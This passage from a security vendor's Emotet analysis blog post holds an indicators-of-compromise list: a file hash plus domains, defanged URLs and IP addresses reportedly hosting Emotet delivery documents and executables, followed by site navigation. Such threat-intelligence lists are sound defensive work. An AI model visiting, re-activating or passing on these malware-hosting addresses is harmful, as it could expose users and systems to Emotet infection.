<pre><code>cb463bc2cfbe95d234afc0d3708babb85c7e29089d3691ab0ba6695eeeccb60f</code></pre>
<h3>Domains (serves delivery documents)</h3>
<pre><code>ahc.mrbdev.com
alokhoa.vn 
honamcharity.ir 
lvita.co 
selloderaza.cl</code></pre>
<h3>Domains (serves Emotet executables)</h3>
<pre><code>5kmtechnologies.com
e-twow.be
qwqoo.com
magnificentpakistan.com
siwakuposo.com
yesimsatirli.com</code></pre>
<h3>URLs (serves delivery documents)</h3>
<pre><code>hxxps://alokhoa.vn/wp-content/uploads/lm/1-91751097-8408196-fcan6yhfsu-gg5ak/
hxxp://honamcharity.ir/mmth4/Documentation/gepvh74lcq7h/
hxxp://lvita.co/tmp/Reporting/
hxxp://www.selloderaza.cl/wp-snapshots/balance/e2o6-62079720-0865-srgnquu24o-ppcdh20p/</code></pre>
<h3>URLs (serves Emotet executables)</h3>
<pre><code>hxxp://ahc.mrbdev.com/wp-admin/qp0/
hxxp://e-twow.be/verde/in6k/
hxxps://humana.5kmtechnologies.com/wp-includes/KdR9xbBq1/
hxxps://magnificentpakistan.com/wp-includes/ha5j0b1/
hxxps://www.qwqoo.com/homldw/3piyy4/
hxxp://siwakuposo.com/siwaku2/X5zB0ey/
hxxp://yesimsatirli.com/baby/HsWjaCfoR/</code></pre>
<h3>IPs (serves delivery documents)</h3>
<pre><code>45.117.169.96
149.129.92.191
158.58.186.204
186.64.116.35</code></pre>
<h3>IPs (serves Emotet executables)</h3>
<pre><code>83.150.215.163
111.90.144.211<!--more--></code></pre></span>
		
		
		
		
		<div id="hs_cos_wrapper_module_17080727372251" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><div class="social-share global-module" data-module-path="/partials/blog-post-layouts/social-share">
 <h3 class="share-title underline">Share this:</h3>
 <p>
	<a target="_blank" href="https://twitter.com/intent/tweet?url=https://www.picussecurity.com/resource/blog/emotet-technical-analysis-part-1-reveal-the-evil-code&amp;text=Emotet%20Technical%20Analysis%20-%20Part%201%20Reveal%20the%20Evil%20Code"><img src="https://www.picussecurity.com/hubfs/2024%20-%20Optimization/versus-cards/x-icon.svg" alt="x-icon" loading="lazy" width="25"></a>
	<a target="_blank" href="http://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.picussecurity.com/resource/blog/emotet-technical-analysis-part-1-reveal-the-evil-code"><img src="https://www.picussecurity.com/hubfs/linkedin_black.svg" alt="LinkedIn" title="LinkedIn" width="26" loading="lazy"></a>
	<a target="_blank" href="http://www.facebook.com/share.php?u=https://www.picussecurity.com/resource/blog/emotet-technical-analysis-part-1-reveal-the-evil-code"><img src="https://www.picussecurity.com/hubfs/facebook_black.svg" alt="Facebook" title="Facebook" width="14" loading="lazy"></a>
 </p>
 <br>
</div></div>

		
	   </div>
	   
	   
	   
	   
	  </div>
	 </article>
	 
	</div>

   </div>

   
   <div class="toc-wrapper">
	<div class="sticky-content" id="sticky-content">
	 
<div id="table-of-contents">
 <h4>Table of Contents</h4>
</div>
	
	</div>
   </div>
  </div>


  
  

	

	
	
	
	
	<div class="content-wrapper latest-resource">
	 <div id="hs_cos_wrapper_module_17207012175882" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><div class="s2-featured-posts module_17207012175882 " id="" data-theme="red">

 <div class="s2-featured-posts__slider" data-autoplay="false" data-autoplay-speed="3000" data-slidestoshow="3">    

  

  
  
  

  

  <div class="s2-featured-posts__item s2-featured-post"> 
   
   <div class="s2-featured-post__thumb">
	<img src="https://www.picussecurity.com/hs-fs/hubfs/ghost-cring-ransomware-ET-preview-feb25.png?width=353&amp;height=200&amp;name=ghost-cring-ransomware-ET-preview-feb25.png" alt="Ghost (Cring) Ransomware Analysis, Simulation, and Mitigation - CISA Alert AA25-050A" width="353" height="200" loading="lazy" srcset="https://www.picussecurity.com/hs-fs/hubfs/ghost-cring-ransomware-ET-preview-feb25.png?width=177&amp;height=100&amp;name=ghost-cring-ransomware-ET-preview-feb25.png 177w, https://www.picussecurity.com/hs-fs/hubfs/ghost-cring-ransomware-ET-preview-feb25.png?width=353&amp;height=200&amp;name=ghost-cring-ransomware-ET-preview-feb25.png 353w, https://www.picussecurity.com/hs-fs/hubfs/ghost-cring-ransomware-ET-preview-feb25.png?width=530&amp;height=300&amp;name=ghost-cring-ransomware-ET-preview-feb25.png 530w, https://www.picussecurity.com/hs-fs/hubfs/ghost-cring-ransomware-ET-preview-feb25.png?width=706&amp;height=400&amp;name=ghost-cring-ransomware-ET-preview-feb25.png 706w, https://www.picussecurity.com/hs-fs/hubfs/ghost-cring-ransomware-ET-preview-feb25.png?width=883&amp;height=500&amp;name=ghost-cring-ransomware-ET-preview-feb25.png 883w, https://www.picussecurity.com/hs-fs/hubfs/ghost-cring-ransomware-ET-preview-feb25.png?width=1059&amp;height=600&amp;name=ghost-cring-ransomware-ET-preview-feb25.png 1059w" sizes="(max-width: 353px) 100vw, 353px">
   </div>
   

   <div class="s2-featured-post__copy">
	<div class="s2-featured-post__rtext">
	 
	 <span class="s2-featured-post__eyebrow h6">Emerging Threat</span>
	 

	 <span class="s2-featured-post__title h5">Ghost (Cring) Ransomware Analysis, Simulation, and Mitigation - CISA Alert AA25-050A</span>
	</div>

	<div class="s2-featured-post__button">
	 
	 









<div class="button-wrapper">
    <a class="button -tertiary" href="https://www.picussecurity.com/resource/blog/ghost-ransomware-analysis-cisa-alert-aa25-050a">
      Learn More<svg xmlns="http://www.w3.org/2000/svg" width="10" height="19" viewbox="0 0 10 19" fill="none">
        <path d="M0.351962 18.7037L9.70386 9.35181L0.351964 -8.71691e-05L0.351962 18.7037Z" fill="var(--secondary-color)" />
      </svg></a></div>

	</div>
   </div>

  </div>
  

  <div class="s2-featured-posts__item s2-featured-post"> 
   
   <div class="s2-featured-post__thumb">
	<img src="https://www.picussecurity.com/hs-fs/hubfs/microsoft-active-directory-ET-preview-feb25.png?width=353&amp;height=200&amp;name=microsoft-active-directory-ET-preview-feb25.png" alt="Microsoft Active Directory Domain Services CVE-2025-21293 Vulnerability Explained" width="353" height="200" loading="lazy" srcset="https://www.picussecurity.com/hs-fs/hubfs/microsoft-active-directory-ET-preview-feb25.png?width=177&amp;height=100&amp;name=microsoft-active-directory-ET-preview-feb25.png 177w, https://www.picussecurity.com/hs-fs/hubfs/microsoft-active-directory-ET-preview-feb25.png?width=353&amp;height=200&amp;name=microsoft-active-directory-ET-preview-feb25.png 353w, https://www.picussecurity.com/hs-fs/hubfs/microsoft-active-directory-ET-preview-feb25.png?width=530&amp;height=300&amp;name=microsoft-active-directory-ET-preview-feb25.png 530w, https://www.picussecurity.com/hs-fs/hubfs/microsoft-active-directory-ET-preview-feb25.png?width=706&amp;height=400&amp;name=microsoft-active-directory-ET-preview-feb25.png 706w, https://www.picussecurity.com/hs-fs/hubfs/microsoft-active-directory-ET-preview-feb25.png?width=883&amp;height=500&amp;name=microsoft-active-directory-ET-preview-feb25.png 883w, https://www.picussecurity.com/hs-fs/hubfs/microsoft-active-directory-ET-preview-feb25.png?width=1059&amp;height=600&amp;name=microsoft-active-directory-ET-preview-feb25.png 1059w" sizes="(max-width: 353px) 100vw, 353px">
   </div>
   

   <div class="s2-featured-post__copy">
	<div class="s2-featured-post__rtext">
	 
	 <span class="s2-featured-post__eyebrow h6">Emerging Threat</span>
	 

	 <span class="s2-featured-post__title h5">Microsoft Active Directory Domain Services CVE-2025-21293 Vulnerability Explained</span>
	</div>

	<div class="s2-featured-post__button">
	 
	 









<div class="button-wrapper">
    <a class="button -tertiary" href="https://www.picussecurity.com/resource/blog/microsoft-active-directory-domain-services-cve-2025-21293-vulnerability-explained">
      Learn More<svg xmlns="http://www.w3.org/2000/svg" width="10" height="19" viewbox="0 0 10 19" fill="none">
        <path d="M0.351962 18.7037L9.70386 9.35181L0.351964 -8.71691e-05L0.351962 18.7037Z" fill="var(--secondary-color)" />
      </svg></a></div>

	</div>
   </div>

  </div>
  

  <div class="s2-featured-posts__item s2-featured-post"> 
   
   <div class="s2-featured-post__thumb">
	<img src="https://www.picussecurity.com/hs-fs/hubfs/operation-lunar-peek-paloalto-ET-preview.png?width=353&amp;height=200&amp;name=operation-lunar-peek-paloalto-ET-preview.png" alt="" width="353" height="200" loading="lazy" srcset="https://www.picussecurity.com/hs-fs/hubfs/operation-lunar-peek-paloalto-ET-preview.png?width=177&amp;height=100&amp;name=operation-lunar-peek-paloalto-ET-preview.png 177w, https://www.picussecurity.com/hs-fs/hubfs/operation-lunar-peek-paloalto-ET-preview.png?width=353&amp;height=200&amp;name=operation-lunar-peek-paloalto-ET-preview.png 353w, https://www.picussecurity.com/hs-fs/hubfs/operation-lunar-peek-paloalto-ET-preview.png?width=530&amp;height=300&amp;name=operation-lunar-peek-paloalto-ET-preview.png 530w, https://www.picussecurity.com/hs-fs/hubfs/operation-lunar-peek-paloalto-ET-preview.png?width=706&amp;height=400&amp;name=operation-lunar-peek-paloalto-ET-preview.png 706w, https://www.picussecurity.com/hs-fs/hubfs/operation-lunar-peek-paloalto-ET-preview.png?width=883&amp;height=500&amp;name=operation-lunar-peek-paloalto-ET-preview.png 883w, https://www.picussecurity.com/hs-fs/hubfs/operation-lunar-peek-paloalto-ET-preview.png?width=1059&amp;height=600&amp;name=operation-lunar-peek-paloalto-ET-preview.png 1059w" sizes="(max-width: 353px) 100vw, 353px">
   </div>
   

   <div class="s2-featured-post__copy">
	<div class="s2-featured-post__rtext">
	 
	 <span class="s2-featured-post__eyebrow h6">Emerging Threat</span>
	 

	 <span class="s2-featured-post__title h5">Palo Alto CVE-2024-0012 and CVE-2024-9474 Vulnerabilities Explained</span>
	</div>

	<div class="s2-featured-post__button">
	 
	 









<div class="button-wrapper">
    <a class="button -tertiary" href="https://www.picussecurity.com/resource/blog/palo-alto-cve-2024-0012-and-cve-2024-9474-vulnerabilities-explained">
      Learn More<svg xmlns="http://www.w3.org/2000/svg" width="10" height="19" viewbox="0 0 10 19" fill="none">
        <path d="M0.351962 18.7037L9.70386 9.35181L0.351964 -8.71691e-05L0.351962 18.7037Z" fill="var(--secondary-color)" />
      </svg></a></div>

	</div>
   </div>

  </div>
  

  <div class="s2-featured-posts__item s2-featured-post"> 
   
   <div class="s2-featured-post__thumb">
	<img src="https://www.picussecurity.com/hs-fs/hubfs/midnight-blizzard-blog-ET-preview-updated.png?width=353&amp;height=200&amp;name=midnight-blizzard-blog-ET-preview-updated.png" alt="" width="353" height="200" loading="lazy" srcset="https://www.picussecurity.com/hs-fs/hubfs/midnight-blizzard-blog-ET-preview-updated.png?width=177&amp;height=100&amp;name=midnight-blizzard-blog-ET-preview-updated.png 177w, https://www.picussecurity.com/hs-fs/hubfs/midnight-blizzard-blog-ET-preview-updated.png?width=353&amp;height=200&amp;name=midnight-blizzard-blog-ET-preview-updated.png 353w, https://www.picussecurity.com/hs-fs/hubfs/midnight-blizzard-blog-ET-preview-updated.png?width=530&amp;height=300&amp;name=midnight-blizzard-blog-ET-preview-updated.png 530w, https://www.picussecurity.com/hs-fs/hubfs/midnight-blizzard-blog-ET-preview-updated.png?width=706&amp;height=400&amp;name=midnight-blizzard-blog-ET-preview-updated.png 706w, https://www.picussecurity.com/hs-fs/hubfs/midnight-blizzard-blog-ET-preview-updated.png?width=883&amp;height=500&amp;name=midnight-blizzard-blog-ET-preview-updated.png 883w, https://www.picussecurity.com/hs-fs/hubfs/midnight-blizzard-blog-ET-preview-updated.png?width=1059&amp;height=600&amp;name=midnight-blizzard-blog-ET-preview-updated.png 1059w" sizes="(max-width: 353px) 100vw, 353px">
   </div>
   

   <div class="s2-featured-post__copy">
	<div class="s2-featured-post__rtext">
	 
	 <span class="s2-featured-post__eyebrow h6">Emerging Threat</span>
	 

	 <span class="s2-featured-post__title h5">Understanding and Mitigating Midnight Blizzard's RDP-Based Spear Phishing Campaign</span>
	</div>

	<div class="s2-featured-post__button">
	 
	 









<div class="button-wrapper">
    <a class="button -tertiary" href="https://www.picussecurity.com/resource/blog/understanding-and-mitigating-midnight-blizzards-rdp-based-spearphishing-campaign">
      Learn More<svg xmlns="http://www.w3.org/2000/svg" width="10" height="19" viewbox="0 0 10 19" fill="none">
        <path d="M0.351962 18.7037L9.70386 9.35181L0.351964 -8.71691e-05L0.351962 18.7037Z" fill="var(--secondary-color)" />
      </svg></a></div>

	</div>
   </div>

  </div>
  

  <div class="s2-featured-posts__item s2-featured-post"> 
   
   <div class="s2-featured-post__thumb">
	<img src="https://www.picussecurity.com/hs-fs/hubfs/fortimanager-blog-ET-preview%20%281%29.png?width=353&amp;height=200&amp;name=fortimanager-blog-ET-preview%20%281%29.png" alt="fortimanager" width="353" height="200" loading="lazy" srcset="https://www.picussecurity.com/hs-fs/hubfs/fortimanager-blog-ET-preview%20%281%29.png?width=177&amp;height=100&amp;name=fortimanager-blog-ET-preview%20%281%29.png 177w, https://www.picussecurity.com/hs-fs/hubfs/fortimanager-blog-ET-preview%20%281%29.png?width=353&amp;height=200&amp;name=fortimanager-blog-ET-preview%20%281%29.png 353w, https://www.picussecurity.com/hs-fs/hubfs/fortimanager-blog-ET-preview%20%281%29.png?width=530&amp;height=300&amp;name=fortimanager-blog-ET-preview%20%281%29.png 530w, https://www.picussecurity.com/hs-fs/hubfs/fortimanager-blog-ET-preview%20%281%29.png?width=706&amp;height=400&amp;name=fortimanager-blog-ET-preview%20%281%29.png 706w, https://www.picussecurity.com/hs-fs/hubfs/fortimanager-blog-ET-preview%20%281%29.png?width=883&amp;height=500&amp;name=fortimanager-blog-ET-preview%20%281%29.png 883w, https://www.picussecurity.com/hs-fs/hubfs/fortimanager-blog-ET-preview%20%281%29.png?width=1059&amp;height=600&amp;name=fortimanager-blog-ET-preview%20%281%29.png 1059w" sizes="(max-width: 353px) 100vw, 353px">
   </div>
   

   <div class="s2-featured-post__copy">
	<div class="s2-featured-post__rtext">
	 
	 <span class="s2-featured-post__eyebrow h6">Emerging Threat</span>
	 

	 <span class="s2-featured-post__title h5">CVE-2024-47575: FortiManager Missing Authentication Zero-Day Vulnerability Explained</span>
	</div>

	<div class="s2-featured-post__button">
	 
	 









<div class="button-wrapper">
    <a class="button -tertiary" href="https://www.picussecurity.com/resource/blog/cve-2024-47575-fortimanager-missing-authentication-zero-day-vulnerability-explained">
      Learn More<svg xmlns="http://www.w3.org/2000/svg" width="10" height="19" viewbox="0 0 10 19" fill="none">
        <path d="M0.351962 18.7037L9.70386 9.35181L0.351964 -8.71691e-05L0.351962 18.7037Z" fill="var(--secondary-color)" />
      </svg></a></div>

	</div>
   </div>

  </div>
  

  <div class="s2-featured-posts__item s2-featured-post"> 
   
   <div class="s2-featured-post__thumb">
	<img src="https://www.picussecurity.com/hs-fs/hubfs/iranian-cyber-actors-brute-force-blog-ET-preview.png?width=353&amp;height=200&amp;name=iranian-cyber-actors-brute-force-blog-ET-preview.png" alt="cisa-alert-aa24-290a" width="353" height="200" loading="lazy" srcset="https://www.picussecurity.com/hs-fs/hubfs/iranian-cyber-actors-brute-force-blog-ET-preview.png?width=177&amp;height=100&amp;name=iranian-cyber-actors-brute-force-blog-ET-preview.png 177w, https://www.picussecurity.com/hs-fs/hubfs/iranian-cyber-actors-brute-force-blog-ET-preview.png?width=353&amp;height=200&amp;name=iranian-cyber-actors-brute-force-blog-ET-preview.png 353w, https://www.picussecurity.com/hs-fs/hubfs/iranian-cyber-actors-brute-force-blog-ET-preview.png?width=530&amp;height=300&amp;name=iranian-cyber-actors-brute-force-blog-ET-preview.png 530w, https://www.picussecurity.com/hs-fs/hubfs/iranian-cyber-actors-brute-force-blog-ET-preview.png?width=706&amp;height=400&amp;name=iranian-cyber-actors-brute-force-blog-ET-preview.png 706w, https://www.picussecurity.com/hs-fs/hubfs/iranian-cyber-actors-brute-force-blog-ET-preview.png?width=883&amp;height=500&amp;name=iranian-cyber-actors-brute-force-blog-ET-preview.png 883w, https://www.picussecurity.com/hs-fs/hubfs/iranian-cyber-actors-brute-force-blog-ET-preview.png?width=1059&amp;height=600&amp;name=iranian-cyber-actors-brute-force-blog-ET-preview.png 1059w" sizes="(max-width: 353px) 100vw, 353px">
   </div>
   

   <div class="s2-featured-post__copy">
	<div class="s2-featured-post__rtext">
	 
	 <span class="s2-featured-post__eyebrow h6">Emerging Threat</span>
	 

	 <span class="s2-featured-post__title h5">Iranian Cyber Actors’ Brute Force and Credential Access Attacks: CISA Alert AA24-290A</span>
	</div>

	<div class="s2-featured-post__button">
	 
	 









<div class="button-wrapper">
    <a class="button -tertiary" href="https://www.picussecurity.com/resource/blog/cisa-alert-aa24-290a-iranian-cyber-actors-brute-force-and-credential-access-attacks">
      Learn More<svg xmlns="http://www.w3.org/2000/svg" width="10" height="19" viewbox="0 0 10 19" fill="none">
        <path d="M0.351962 18.7037L9.70386 9.35181L0.351964 -8.71691e-05L0.351962 18.7037Z" fill="var(--secondary-color)" />
      </svg></a></div>

	</div>
   </div>

  </div>
  

  <div class="s2-featured-posts__item s2-featured-post"> 
   
   <div class="s2-featured-post__thumb">
	<img src="https://www.picussecurity.com/hs-fs/hubfs/whisper-gate-russian-blog-ET-preview.png?width=353&amp;height=200&amp;name=whisper-gate-russian-blog-ET-preview.png" alt="" width="353" height="200" loading="lazy" srcset="https://www.picussecurity.com/hs-fs/hubfs/whisper-gate-russian-blog-ET-preview.png?width=177&amp;height=100&amp;name=whisper-gate-russian-blog-ET-preview.png 177w, https://www.picussecurity.com/hs-fs/hubfs/whisper-gate-russian-blog-ET-preview.png?width=353&amp;height=200&amp;name=whisper-gate-russian-blog-ET-preview.png 353w, https://www.picussecurity.com/hs-fs/hubfs/whisper-gate-russian-blog-ET-preview.png?width=530&amp;height=300&amp;name=whisper-gate-russian-blog-ET-preview.png 530w, https://www.picussecurity.com/hs-fs/hubfs/whisper-gate-russian-blog-ET-preview.png?width=706&amp;height=400&amp;name=whisper-gate-russian-blog-ET-preview.png 706w, https://www.picussecurity.com/hs-fs/hubfs/whisper-gate-russian-blog-ET-preview.png?width=883&amp;height=500&amp;name=whisper-gate-russian-blog-ET-preview.png 883w, https://www.picussecurity.com/hs-fs/hubfs/whisper-gate-russian-blog-ET-preview.png?width=1059&amp;height=600&amp;name=whisper-gate-russian-blog-ET-preview.png 1059w" sizes="(max-width: 353px) 100vw, 353px">
   </div>
   

   <div class="s2-featured-post__copy">
	<div class="s2-featured-post__rtext">
	 
	 <span class="s2-featured-post__eyebrow h6">Emerging Threat</span>
	 

	 <span class="s2-featured-post__title h5">CISA Alert AA24-249A: Russian GRU Unit 29155 Targeting U.S. and Global Critical Infrastructure</span>
	</div>

	<div class="s2-featured-post__button">
	 
	 









<div class="button-wrapper">
    <a class="button -tertiary" href="https://www.picussecurity.com/resource/blog/cisa-alert-aa24-249a-russian-military-cyber-actors-target-us-and-global-critical-infrastructure">
      Learn More<svg xmlns="http://www.w3.org/2000/svg" width="10" height="19" viewbox="0 0 10 19" fill="none">
        <path d="M0.351962 18.7037L9.70386 9.35181L0.351964 -8.71691e-05L0.351962 18.7037Z" fill="var(--secondary-color)" />
      </svg></a></div>

	</div>
   </div>

  </div>
  

  <div class="s2-featured-posts__item s2-featured-post"> 
   
   <div class="s2-featured-post__thumb">
	<img src="https://www.picussecurity.com/hs-fs/hubfs/remote-kernel-explotation-blog-ET-preview.jpg?width=353&amp;height=200&amp;name=remote-kernel-explotation-blog-ET-preview.jpg" alt="emerging-threat" width="353" height="200" loading="lazy" srcset="https://www.picussecurity.com/hs-fs/hubfs/remote-kernel-explotation-blog-ET-preview.jpg?width=177&amp;height=100&amp;name=remote-kernel-explotation-blog-ET-preview.jpg 177w, https://www.picussecurity.com/hs-fs/hubfs/remote-kernel-explotation-blog-ET-preview.jpg?width=353&amp;height=200&amp;name=remote-kernel-explotation-blog-ET-preview.jpg 353w, https://www.picussecurity.com/hs-fs/hubfs/remote-kernel-explotation-blog-ET-preview.jpg?width=530&amp;height=300&amp;name=remote-kernel-explotation-blog-ET-preview.jpg 530w, https://www.picussecurity.com/hs-fs/hubfs/remote-kernel-explotation-blog-ET-preview.jpg?width=706&amp;height=400&amp;name=remote-kernel-explotation-blog-ET-preview.jpg 706w, https://www.picussecurity.com/hs-fs/hubfs/remote-kernel-explotation-blog-ET-preview.jpg?width=883&amp;height=500&amp;name=remote-kernel-explotation-blog-ET-preview.jpg 883w, https://www.picussecurity.com/hs-fs/hubfs/remote-kernel-explotation-blog-ET-preview.jpg?width=1059&amp;height=600&amp;name=remote-kernel-explotation-blog-ET-preview.jpg 1059w" sizes="(max-width: 353px) 100vw, 353px">
   </div>
   

   <div class="s2-featured-post__copy">
	<div class="s2-featured-post__rtext">
	 
	 <span class="s2-featured-post__eyebrow h6">Emerging Threat</span>
	 

	 <span class="s2-featured-post__title h5">CVE-2024-38063: Remote Kernel Exploitation via IPv6 in Windows</span>
	</div>

	<div class="s2-featured-post__button">
	 
	 









<div class="button-wrapper">
    <a class="button -tertiary" href="https://www.picussecurity.com/resource/blog/cve-2024-38063-remote-kernel-exploitation-via-ipv6-in-windows">
      Learn More<svg xmlns="http://www.w3.org/2000/svg" width="10" height="19" viewbox="0 0 10 19" fill="none">
        <path d="M0.351962 18.7037L9.70386 9.35181L0.351964 -8.71691e-05L0.351962 18.7037Z" fill="var(--secondary-color)" />
      </svg></a></div>

	</div>
   </div>

  </div>
  

  <div class="s2-featured-posts__item s2-featured-post"> 
   
   <div class="s2-featured-post__thumb">
	<img src="https://www.picussecurity.com/hs-fs/hubfs/Snatch%20Ransomware%20Explained-CISA%20Alert%20AA23-263A%20%281%29.png?width=353&amp;height=200&amp;name=Snatch%20Ransomware%20Explained-CISA%20Alert%20AA23-263A%20%281%29.png" alt="RansomHub-Ransomware" width="353" height="200" loading="lazy" srcset="https://www.picussecurity.com/hs-fs/hubfs/Snatch%20Ransomware%20Explained-CISA%20Alert%20AA23-263A%20%281%29.png?width=177&amp;height=100&amp;name=Snatch%20Ransomware%20Explained-CISA%20Alert%20AA23-263A%20%281%29.png 177w, https://www.picussecurity.com/hs-fs/hubfs/Snatch%20Ransomware%20Explained-CISA%20Alert%20AA23-263A%20%281%29.png?width=353&amp;height=200&amp;name=Snatch%20Ransomware%20Explained-CISA%20Alert%20AA23-263A%20%281%29.png 353w, https://www.picussecurity.com/hs-fs/hubfs/Snatch%20Ransomware%20Explained-CISA%20Alert%20AA23-263A%20%281%29.png?width=530&amp;height=300&amp;name=Snatch%20Ransomware%20Explained-CISA%20Alert%20AA23-263A%20%281%29.png 530w, https://www.picussecurity.com/hs-fs/hubfs/Snatch%20Ransomware%20Explained-CISA%20Alert%20AA23-263A%20%281%29.png?width=706&amp;height=400&amp;name=Snatch%20Ransomware%20Explained-CISA%20Alert%20AA23-263A%20%281%29.png 706w, https://www.picussecurity.com/hs-fs/hubfs/Snatch%20Ransomware%20Explained-CISA%20Alert%20AA23-263A%20%281%29.png?width=883&amp;height=500&amp;name=Snatch%20Ransomware%20Explained-CISA%20Alert%20AA23-263A%20%281%29.png 883w, https://www.picussecurity.com/hs-fs/hubfs/Snatch%20Ransomware%20Explained-CISA%20Alert%20AA23-263A%20%281%29.png?width=1059&amp;height=600&amp;name=Snatch%20Ransomware%20Explained-CISA%20Alert%20AA23-263A%20%281%29.png 1059w" sizes="(max-width: 353px) 100vw, 353px">
   </div>
   

   <div class="s2-featured-post__copy">
	<div class="s2-featured-post__rtext">
	 
	 <span class="s2-featured-post__eyebrow h6">Emerging Threat</span>
	 

	 <span class="s2-featured-post__title h5">RansomHub Ransomware Analysis, Simulation, and Mitigation - CISA Alert AA24-242A</span>
	</div>

	<div class="s2-featured-post__button">
	 
	 









<div class="button-wrapper">
    <a class="button -tertiary" href="https://www.picussecurity.com/resource/blog/ransomhub-ransomware-cisa-alert-aa24-242a">
      Learn More<svg xmlns="http://www.w3.org/2000/svg" width="10" height="19" viewbox="0 0 10 19" fill="none">
        <path d="M0.351962 18.7037L9.70386 9.35181L0.351964 -8.71691e-05L0.351962 18.7037Z" fill="var(--secondary-color)" />
      </svg></a></div>

	</div>
   </div>

  </div>
  

  

 </div>

 <div class="s2-featured-posts__arrows">
  <button class="slick-prev">
   <svg xmlns="http://www.w3.org/2000/svg" width="34" height="35" viewbox="0 0 34 35" fill="none">
	<circle cx="17" cy="17.7039" r="17" fill="currentColor" />
	<path d="M9 17.5L20 7V28L9 17.5Z" fill="white" />
   </svg>
  </button>
  <button class="slick-next">
   <svg xmlns="http://www.w3.org/2000/svg" width="34" height="35" viewbox="0 0 34 35" fill="none">
	<circle cx="17" cy="17" r="17" transform="matrix(-1 0 0 1 34 0.703857)" fill="currentColor" />
	<path d="M25 17.5L14 7V28L25 17.5Z" fill="white" />
   </svg>
  </button>
 </div>

</div>



</div>
	</div>
  
  
  
  
  
	

 </div>
 
 
 
 <div id="hs_cos_wrapper_module_16904584048193" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><div class="subscribe-banner-w dnd-section">
 <div class="row-fluid d-flex">
	<div class="subscribe-banner-w-text">
	 <div class="wow fadeIn" data-wow-delay="0.5" style="visibility: visible; animation-name: fadeIn;">			 
		<h2>Get the Latest Insights<br>Delivered Straight to Your Inbox</h2>
	 </div>
	</div>
	<div class="subscribe-banner-w-form">
	 <section class="form-step-1 blog-banner">
		<span id="hs_cos_wrapper_module_16904584048193_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_form" style="" data-hs-cos-general-type="widget" data-hs-cos-type="form"><h3 id="hs_cos_wrapper_form_353648843_title" class="hs_cos_wrapper form-title" data-hs-cos-general-type="widget_field" data-hs-cos-type="text"></h3>

<div id="hs_form_target_form_353648843"></div>









</span>
	 </section>  
	</div><!--end widget-span -->
 </div>
</div></div>
 
 
</main>

<!-- End partial -->




	 
	 <div data-global-resource-path="Shield/templates/partials/footer-v2.html"><footer class="footer" id="office-locations">
 <div class="footer__main dnd-section">

  <div class="footer-col-wrap row-fluid">
   <div class="footer-col">
	<p class="title">Platform</p>
	<div id="hs_cos_wrapper_Platform_Menu" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module widget-type-menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">
<span id="hs_cos_wrapper_Platform_Menu_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="menu"><div id="hs_menu_wrapper_Platform_Menu_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-vertical" role="navigation" data-sitemap-name="default" data-menu-id="32488279843" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/security-validation-platform" role="menuitem">The Security Validation Platform</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/platform/security-control-validation" role="menuitem">Security Control Validation</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/platform/attack-surface-validation" role="menuitem">Attack Surface Validation</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/platform/cloud-security-validation" role="menuitem">Cloud Security Validation</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/platform/attack-path-validation" role="menuitem">Attack Path Validation</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/platform/detection-rule-validation" role="menuitem">Detection Rule Validation</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/integrations" role="menuitem">Integrations</a></li>
 </ul>
</div></span></div>
   </div>
   <div class="footer-col">		
	<p class="title">Use Cases</p>
	<div id="hs_cos_wrapper_Use_Cases_Menu" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module widget-type-menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">
<span id="hs_cos_wrapper_Use_Cases_Menu_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="menu"><div id="hs_menu_wrapper_Use_Cases_Menu_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-vertical" role="navigation" data-sitemap-name="default" data-menu-id="34050730072" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/breach-and-attack-simulation" role="menuitem">Breach and Attack Simulation</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/use-case/pen-testing-automation" role="menuitem">Automated Penetration Testing</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/use-case/adversarial-exposure-validation" role="menuitem">Adversarial Exposure Validation</a></li>
 </ul>
</div></span></div>
   </div>
   <div class="footer-col resources">
	<p class="title">Resources</p>
	<div id="hs_cos_wrapper_Resources_Menu" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module widget-type-menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">
<span id="hs_cos_wrapper_Resources_Menu_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="menu"><div id="hs_menu_wrapper_Resources_Menu_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-vertical" role="navigation" data-sitemap-name="default" data-menu-id="32488136213" aria-label="Navigation Menu">
 <ul role="menu">
